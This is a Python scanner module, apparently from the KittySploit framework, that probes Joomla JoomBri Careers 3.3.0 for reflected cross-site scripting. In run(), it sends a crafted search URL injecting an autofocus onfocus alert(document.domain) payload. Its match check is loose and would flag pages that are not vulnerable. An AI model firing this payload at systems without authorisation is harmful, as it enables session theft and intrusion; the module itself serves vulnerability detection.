#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting Detection',
        'description': "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'xss', 'joomla', 'joombri', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html',
            'https://cxsecurity.com/issue/WLB-2022100024',
            'https://extensions.joomla.org/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('alert(document.domain)', 'joomla', 'joombri', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting detected",
                path='/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p',
            )
            return True
        return False

